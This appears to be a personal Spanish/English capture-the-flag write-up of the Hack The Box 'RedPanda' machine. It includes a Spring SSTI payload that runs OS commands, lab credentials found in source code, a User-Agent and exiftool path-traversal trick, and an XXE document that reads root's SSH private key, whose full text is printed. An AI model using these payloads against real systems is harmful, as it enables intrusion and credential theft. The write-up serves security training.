Web Enumeration  
XML XXE JAVA injection  
script creado : javainject

What is SSTI?  
Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. As quoted by OWASP, Server Side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. More information on SSTI can be found here.

* * *

Finding the vulnerability I use:

```
*
{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id')
.getInputStream())}
```

&nbsp;

Tambien se puede usar el script python javainject  (para usar el python binario a un nuevo servidor cambiar la IP en el script python)

```
javainject "whoami"
```

```
javainject "ps -fuax"
```

```bash
root         876  0.0  0.1   8356  3356 ?        S    01:52   0:00  \_ /usr/sbin/CRON -f
root         880  0.0  0.0   2608   532 ?        Ss   01:52   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         881  0.0  0.2   9420  4628 ?        S    01:52   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      898  5.8 10.0 3103756 203084 ?      Sl   01:52   0:19              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root        1178  0.0  0.1   8012  3372 ?        S    01:57   0:00                  \_ su -l
woodenk     1204  0.0  0.1   9488  3912 ?        R    01:58   0:00                  \_ ps -fuax
```

se busca en los directorios del usuario que se encontro en la pagina web:

```bash
javainject "grep -r woodenk /opt/panda_search/ "
```

```bash
javainject "cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java"
```

Found credentials on the line:

```
conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
```

login ssh with woodenk and RedPandazRule

we look for new process with the script newprocess or we download the pspy from: https://github.com/DominicBreuker/pspy  
with new process script we found:

El codigo log ejecutable que se modifica se encuentra en

```
nano /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java 
```

we download a image from the same website:  
<br/>de ahi se cambia el artista:

Cree la imagen con:  
`exiftool -Artist=../dev/shm/ippsec lazy.jpg`

y la mando con wget a la otra maquina a el folder: /dev/shm/ de la maquina servidor 

si mando esta solicitud a el servidor:

```
curl -s -X GET -A "prubea" http://10.10.11.170:8080
```

se guarda un log en

```
watch -n 1 cat /opt/panda_search/redpanda.log
```

que nos da el cat:  
`200||10.10.14.2||prubea||/`  
Ya que modificamos el log, enviamos la imagen modificada con la ruta /dev/shm/ con el artista modificado.

tambien se tiene que crear el archivo y modificarlo: ippsec_creds.xml, cambiar a chmod 777 por si acaso

y se modifico el archivo ippsec_creds.xml a esto:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>ippsec</author>
  <image>
         <uri>/../../../../../../dev/shm/ippsec.jpg</uri>
    <views>0</views>
    <data>&xxe;</data>
  </image>
  <totalviews>1</totalviews>
</credits>
```

envio la solicitud del cambio del archivo log para escribirlo

```
curl -s -X GET -A "prueba||/../../../../../../dev/shm/ippsec.jpg" http://10.10.11.170:8080/
```

&nbsp;

y no funciono, los archivos se encuentran en /dev/shm/  
perdon si funciono.  
TENER CUIDADO CON LA ESTRUCTURA DE XML  
no funciono hastsa que estaba bien formateado.

la id_rsa llego a :  
`watch -n 1 cat ippsec_creds.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>ippsec</author>
  <image>
    <uri>/../../../../../../dev/shm/ippsec.jpg</uri>
    <views>1</views>
    <data>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</data>
  </image>
  <totalviews>2</totalviews>
</credits>
```

ya de ahi simplemente usar la clave para logear como root, con chmod 600

&nbsp;  
   
   
   
   
   
   
 

&nbsp;

&nbsp;  
   
 

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

[RedPanda.pdf](:/789d3583eebb4aceb5c1208d306766ee)